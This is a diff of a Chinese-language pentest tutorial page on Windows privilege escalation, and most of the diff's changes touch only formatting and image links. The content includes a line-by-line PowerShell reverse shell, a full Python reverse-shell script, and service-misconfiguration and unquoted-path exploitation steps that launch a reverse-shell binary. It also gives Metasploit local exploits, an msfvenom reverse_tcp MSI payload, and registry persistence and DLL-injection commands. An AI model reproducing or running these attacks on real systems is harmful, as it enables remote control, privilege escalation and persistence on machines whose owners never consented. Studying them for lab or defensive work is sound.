+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;iex $data&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 使用 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;Invoke-Expression&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">（</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;iex&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">）执行 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$data&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 中的命令。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;2&gt;&amp;1&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 将错误输出重定向到标准输出。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;| Out-String&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 将输出转换为字符串。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">构造返回的字符串，包括命令的输出和当前路径。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$sendback</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 命令的输出。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 当前路径提示符。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$sendback&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 命令的输出。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 当前路径提示符。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">将返回的字符串转换为字节数组。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$stream.Write($sendbyte,0,$sendbyte.Length)</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$stream.Write($sendbyte,0,$sendbyte.Length)&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">将返回的字节写回网络流。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$stream.Flush()</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$stream.Flush()&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">刷新网络流，确保所有数据都已发送。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$client.Close()</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$client.Close()&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font></li>
 </ol>
 <ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">关闭 TCP 客户端。</font></li>
@@ -846,7 +844,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -H -i -f cmd.exe</span><br></pre></td></tr></table></figure>
 
 <h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><ul>
-<li>kali<ul>
+<li>kali  <ul>
 <li>nc -lvp 5555</li>
 </ul>
 </li>
@@ -854,16 +852,17 @@
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import os</span><br><span class="line">import select</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def ReserveConnect(addr, port):</span><br><span class="line">    &#x27;&#x27;&#x27;反弹连接shell&#x27;&#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        shell.connect((addr,port))</span><br><span class="line">    except Exception as reason:</span><br><span class="line">        print (&#x27;[-] Failed to Create Socket : %s&#x27;%reason)</span><br><span class="line">        exit(0)</span><br><span class="line">    rlist = [shell]</span><br><span class="line">    wlist = []</span><br><span class="line">    elist = [shell]</span><br><span class="line">    while True:</span><br><span class="line">        shell.send(&quot;cmd:&quot;.encode())</span><br><span class="line">        rs,ws,es = select.select(rlist,wlist,wlist)</span><br><span class="line">        for sockfd in rs:</span><br><span class="line">            if sockfd == shell:</span><br><span class="line">                command = shell.recv(1024)</span><br><span class="line">                if command == &#x27;exit&#x27;:</span><br><span class="line">                    shell.close()</span><br><span class="line">                    break</span><br><span class="line">                result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()</span><br><span class="line">                shell.sendall(result.decode(&quot;GB2312&quot;).encode(&quot;UTF-8&quot;))</span><br><span class="line"></span><br><span class="line"># 主函数运行</span><br><span class="line">def run():</span><br><span class="line">    if len(sys.argv)&lt;3:</span><br><span class="line">        print(&#x27;Usage: python reverse.py [IP] [PORT]&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        url = sys.argv[1]</span><br><span class="line">        port = int(sys.argv[2])</span><br><span class="line">        ReserveConnect(url,port)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 执行python reverse_win.py 127.0.0.1 5555</span><br></pre></td></tr></table></figure>
-
+<pre><code>- 执行python reverse_win.py 127.0.0.1 5555
+</code></pre>
 <h2 id="Windows-内核溢出漏洞"><a href="#Windows-内核溢出漏洞" class="headerlink" title="Windows 内核溢出漏洞"></a>Windows 内核溢出漏洞</h2><h3 id="一：手工"><a href="#一：手工" class="headerlink" title="一：手工"></a>一：手工</h3><ol>
-<li>systeminfo</li>
+<li>systeminfo </li>
 <li>python wes.py  sys.txt    <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></li>
 <li>查找内核提权exp<ol>
-<li><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a>     </font>\ <font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/KernelHub">https://github.com/Ascotbe/KernelHub</a>   </font>\ <font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a>  </font>\ <font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a> </font>\ <font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="http://cve.mitre.org/data/refs/refmap/source-MS.html">http://cve.mitre.org/data/refs/refmap/source-MS.html</a></font></li>
+<li><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a>     </font></li>
 </ol>
 </li>
 </ol>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/KernelHub">https://github.com/Ascotbe/KernelHub</a>   </font><br><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a>  </font><br><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a> </font><br><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><a target="_blank" rel="noopener" href="http://cve.mitre.org/data/refs/refmap/source-MS.html">http://cve.mitre.org/data/refs/refmap/source-MS.html</a></font></p>
 <h3 id="二-msf自动-反弹shell后"><a href="#二-msf自动-反弹shell后" class="headerlink" title="二:msf自动(反弹shell后)"></a><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">二:msf自动(反弹shell后)</font></h3><ol>
 <li>post&#x2F;windows&#x2F;gather&#x2F;enum_patches(半自动，还得自己找,<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">找出系统中缺少的补丁</font>)<ol>
 <li>bg</li>
@@ -877,12 +876,12 @@
 <li><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester.</font></li>
 <li><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">set session 1</font></li>
 <li><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">run  找到绿色的，可用的,一个一个试</font></li>
-<li><img src="/../img/spj672lzkVrm2XkE/1762421135653-827c57ea-7636-42c3-a8e7-6d681894e991-627419.png" alt="1762421135653-827c57ea-7636-42c3-a8e7-6d681894e991.png"></li>
+<li><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762421135653-827c57ea-7636-42c3-a8e7-6d681894e991.png"></li>
 <li>用第一个试试  use exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated</li>
 <li>set session 1</li>
-<li><img src="/../img/spj672lzkVrm2XkE/1762421213968-0e50f866-389a-4c14-8062-a2199acbe6cc-485656.png" alt="1762421213968-0e50f866-389a-4c14-8062-a2199acbe6cc.png"></li>
+<li><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762421213968-0e50f866-389a-4c14-8062-a2199acbe6cc.png"></li>
 <li>换一个不一样的端口，然后，另外打开一个msf,监听这个端口</li>
-<li><img src="/../img/spj672lzkVrm2XkE/1762421584331-664dba0b-f29d-42af-b0d3-538b51561794-573396.png" alt="1762421584331-664dba0b-f29d-42af-b0d3-538b51561794.png"></li>
+<li><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762421584331-664dba0b-f29d-42af-b0d3-538b51561794.png"></li>
 </ol>
 </li>
 </ol>
@@ -926,22 +925,32 @@
 <td align="left"><font style="color:rgb(0, 0, 0);">accesschk -wuo everyone &lt;&#x2F;font&gt;</td>
 </tr>
 </tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- 反弹shell</span><br><span class="line">- 用winPEASany.exe 检查&lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;服务配置错误     .\winPEASany.exe quiet servicesinfo&lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;查看是否有手工修改的服务&lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;.\accesschk.exe /accepteula -uwcqv  &quot;user&quot;  &quot;服务&quot;&lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;检查用户或组是否有权访问文件，目录，服务和注册表项&lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;sc qc  &quot;服务&quot;    &lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;检查当前配置&lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;sc config &lt;/font&gt;&lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;&quot;服务&quot;&lt;/font&gt;&lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt; binpath=  &quot;\&quot;C:\Users\user\Desktop\a002.exe\&quot;&quot; &lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;重新配置服务使我们反向shell&lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;net start &lt;/font&gt;&lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;&quot;服务&quot;&lt;/font&gt;</span><br><span class="line">- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;启动服务触发漏洞反弹shell&lt;/font&gt;</span><br></pre></td></tr></table></figure>
-
+<pre><code>- 反弹shell
+- 用winPEASany.exe 检查&lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;服务配置错误     .\winPEASany.exe quiet servicesinfo&lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;查看是否有手工修改的服务&lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;.\accesschk.exe /accepteula -uwcqv  &quot;user&quot;  &quot;服务&quot;&lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;检查用户或组是否有权访问文件，目录，服务和注册表项&lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;sc qc  &quot;服务&quot;    &lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;检查当前配置&lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;sc config &lt;/font&gt;&lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;&quot;服务&quot;&lt;/font&gt;&lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt; binpath=  &quot;\&quot;C:\Users\user\Desktop\a002.exe\&quot;&quot; &lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;重新配置服务使我们反向shell&lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;net start &lt;/font&gt;&lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;&quot;服务&quot;&lt;/font&gt;
+- &lt;font style=&quot;color:rgb(36, 41, 47);&quot;&gt;启动服务触发漏洞反弹shell&lt;/font&gt;
+</code></pre>
 <h3 id="2-未引用的服务路径"><a href="#2-未引用的服务路径" class="headerlink" title="2.未引用的服务路径"></a>2.未引用的服务路径</h3><h5 id="1-运行winPEAS以检查服务配置错误："><a href="#1-运行winPEAS以检查服务配置错误：" class="headerlink" title="1.运行winPEAS以检查服务配置错误："></a><font style="color:rgb(36, 41, 47);">1.运行winPEAS以检查服务配置错误：</font></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winPEASany.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762743687636-de3e5b02-ca9f-49de-b219-b3d8d43569d8-545383.png" alt="1762743687636-de3e5b02-ca9f-49de-b219-b3d8d43569d8.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762743687636-de3e5b02-ca9f-49de-b219-b3d8d43569d8.png"></p>
 <h5 id="2-发现”unquotedsvc”服务有一个未引用的路径-，其中也-包含-空格："><a href="#2-发现”unquotedsvc”服务有一个未引用的路径-，其中也-包含-空格：" class="headerlink" title="2. 发现”unquotedsvc”服务有一个未引用的路径 ，其中也 包含 空格："></a><font style="color:rgb(36, 41, 47);">2. 发现”unquotedsvc”服务有一个未引用的路径 ，其中也 包含 空格：</font></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</span><br></pre></td></tr></table></figure>
 
 <h5 id="3-使用sc确认此问题："><a href="#3-使用sc确认此问题：" class="headerlink" title="3. 使用sc确认此问题："></a><font style="color:rgb(36, 41, 47);">3. 使用sc确认此问题：</font></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc unquotedsvc</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762743686694-62bdbec8-0307-42fc-8d3e-8d66b604a29c-888818.png" alt="1762743686694-62bdbec8-0307-42fc-8d3e-8d66b604a29c.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762743686694-62bdbec8-0307-42fc-8d3e-8d66b604a29c.png"></p>
 <h5 id="4-使用accesschk-exe检查写入权限："><a href="#4-使用accesschk-exe检查写入权限：" class="headerlink" title="4.使用accesschk.exe检查写入权限："></a><font style="color:rgb(36, 41, 47);">4.使用accesschk.exe检查写入权限：</font></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe /accepteula -uwdq C:\</span><br><span class="line">  .\accesschk.exe /accepteula -uwdq <span class="string">&quot;C:\Program Files\&quot; </span></span><br><span class="line"><span class="string">  .\accesschk.exe /accepteula -uwdq &quot;</span>C:\Program Files\Unquoted Path Service\&quot;</span><br><span class="line">  1. .\accesschk.exe /accepteula -uwdq C:\</span><br><span class="line">**功能 功能：扫描 C 盘根目录下的所有文件和文件夹</span><br><span class="line">参数含义：</span><br><span class="line">/accepteula：自动接受最终用户许可协议</span><br><span class="line">-u：只显示当前用户的权限</span><br><span class="line">-w：只显示有写入权限的项目</span><br><span class="line">-d：显示目录权限</span><br><span class="line">-q：静默模式，不显示横幅</span><br><span class="line">2. .\accesschk.exe /accepteula -uwdq <span class="string">&quot;C:\Program Files\&quot;</span></span><br><span class="line"><span class="string">功能：扫描 Program Files 目录及其子目录</span></span><br><span class="line"><span class="string">目的：找出当前用户在 Program Files 中有写入权限的位置</span></span><br><span class="line"><span class="string">3. .\accesschk.exe /accepteula -uwdq &quot;</span>C:\Program Files\Unquoted Path Service\&quot;</span><br><span class="line">功能：专门扫描特定服务目录</span><br><span class="line">特点：这是一个典型的未加引号的服务路径示例</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762743688265-48d95ad8-62ae-4502-b74c-569545fe0506-597752.png" alt="1762743688265-48d95ad8-62ae-4502-b74c-569545fe0506.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762743688265-48d95ad8-62ae-4502-b74c-569545fe0506.png"></p>
 <h5 id="5-复制可执行的反向外壳并适当重命名"><a href="#5-复制可执行的反向外壳并适当重命名" class="headerlink" title="5.复制可执行的反向外壳并适当重命名"></a><font style="color:rgb(36, 41, 47);">5.复制可执行的反向外壳并适当重命名</font></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\user\Desktop\a002.exe <span class="string">&quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;</span></span><br><span class="line">  系统会按以下顺序查找可执行文件：</span><br><span class="line"></span><br><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Unquoted.exe</span><br><span class="line">C:\Program Files\Unquoted Path.exe</span><br><span class="line">C:\Program Files\Unquoted Path Service\Common.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762743686713-71c89bdf-3e23-4b31-9e5f-d3a8bfdcdd50-569436.png" alt="1762743686713-71c89bdf-3e23-4b31-9e5f-d3a8bfdcdd50.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762743686713-71c89bdf-3e23-4b31-9e5f-d3a8bfdcdd50.png"></p>
 <h5 id="6-启动服务触发漏洞进行反弹shell"><a href="#6-启动服务触发漏洞进行反弹shell" class="headerlink" title="6.启动服务触发漏洞进行反弹shell"></a><font style="color:rgb(36, 41, 47);">6.启动服务触发漏洞进行反弹shell</font></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start unquotedsvc</span><br></pre></td></tr></table></figure>
 
 <h3 id="3-注册表权限弱"><a href="#3-注册表权限弱" class="headerlink" title="3.注册表权限弱"></a>3.注册表权限弱</h3><ul>
@@ -970,7 +979,7 @@
 <p><font style="color:rgb(51, 51, 51);">如果该设置启用，可以利用它来执行恶意 MSI 文件：</font></p>
 <p>msiexec &#x2F;i malicious.msi</p>
 <ul>
-<li>msf</li>
+<li>msf </li>
 <li><font style="color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);">use exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated(先反弹shell)</font></li>
 <li><font style="color:rgb(51, 51, 51);">如果失败了我们可以使用MSF生成 msi文件然后上传上去运行即可</font></li>
 <li><font style="color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;6789 -f msi -o payload.msi</font></li>
@@ -1008,11 +1017,11 @@
 <h3 id="7-注册表钩子"><a href="#7-注册表钩子" class="headerlink" title="7 注册表钩子"></a><font style="color:rgba(0, 0, 0, 0.85);">7 注册表钩子</font></h3><p><font style="color:rgb(51, 51, 51);">攻击者可以在注册表中添加钩子，使得当某些注册表项被访问时，恶意代码会被执行。</font></p>
 <p><font style="color:rgb(51, 51, 51);">示例：</font></p>
 <p>reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\target.exe” &#x2F;v “Debugger” &#x2F;t REG_SZ &#x2F;d “C:\malicious.exe” &#x2F;f</p>
-<p><font style="color:rgb(51, 51, 51);">此命令会使</font><code><font style="color:rgb(51, 51, 51);">target.exe</font></code><font style="color:rgb(51, 51, 51);">在每次执行时都启动</font><code><font style="color:rgb(51, 51, 51);">malicious.exe</font></code><font style="color:rgb(51, 51, 51);">。</font></p>
-<h3 id="8-AppInit-DLLs-注入"><a href="#8-AppInit-DLLs-注入" class="headerlink" title="8 AppInit_DLLs 注入"></a><font style="color:rgba(0, 0, 0, 0.85);">8 AppInit_DLLs 注入</font></h3><p><font style="color:rgb(51, 51, 51);">通过修改</font><code><font style="color:rgb(51, 51, 51);">AppInit_DLLs</font></code><font style="color:rgb(51, 51, 51);">注册表项，攻击者可以将 DLL 注入到所有进程中，从而获得系统控制权。</font></p>
+<p><font style="color:rgb(51, 51, 51);">此命令会使</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;target.exe&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">在每次执行时都启动</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;malicious.exe&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">。</font></p>
+<h3 id="8-AppInit-DLLs-注入"><a href="#8-AppInit-DLLs-注入" class="headerlink" title="8 AppInit_DLLs 注入"></a><font style="color:rgba(0, 0, 0, 0.85);">8 AppInit_DLLs 注入</font></h3><p><font style="color:rgb(51, 51, 51);">通过修改</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;AppInit_DLLs&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">注册表项，攻击者可以将 DLL 注入到所有进程中，从而获得系统控制权。</font></p>
 <p><font style="color:rgb(51, 51, 51);">示例：</font></p>
 <p>reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows” &#x2F;v “AppInit_DLLs” &#x2F;t REG_SZ &#x2F;d “C:\malicious.dll” &#x2F;f</p>
-<p><font style="color:rgb(51, 51, 51);">此命令会在所有进程启动时加载</font><code><font style="color:rgb(51, 51, 51);">malicious.dll</font></code><font style="color:rgb(51, 51, 51);">。</font></p>
+<p><font style="color:rgb(51, 51, 51);">此命令会在所有进程启动时加载</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;malicious.dll&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">。</font></p>
 <h3 id="9-启动与恢复设置"><a href="#9-启动与恢复设置" class="headerlink" title="9 启动与恢复设置"></a><font style="color:rgba(0, 0, 0, 0.85);">9 启动与恢复设置</font></h3><p><font style="color:rgb(51, 51, 51);">攻击者可以修改系统的启动与恢复设置，以便在系统崩溃时执行恶意代码。</font></p>
 <p><font style="color:rgb(51, 51, 51);">示例：</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl&quot; /v &quot;AutoReboot&quot; /t REG_DWORD /d &quot;0&quot; /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl&quot; /v &quot;DumpFile&quot; /t REG_EXPAND_SZ /d &quot;C:\malicious.dmp&quot; /f</span><br></pre></td></tr></table></figure>
@@ -1093,10 +1102,10 @@
 <h5 id="这些因素直接影响你能否找到可用的-CLSID，是整个利用过程中的关键环节。"><a href="#这些因素直接影响你能否找到可用的-CLSID，是整个利用过程中的关键环节。" class="headerlink" title="这些因素直接影响你能否找到可用的 CLSID，是整个利用过程中的关键环节。"></a><font style="color:rgba(0, 0, 0, 0.88);">这些因素直接影响你能否找到可用的 CLSID，是整个利用过程中的关键环节。</font></h5><ol>
 <li><strong><font style="color:rgba(0, 0, 0, 0.88);">一个有效的 CLSID</font></strong><ul>
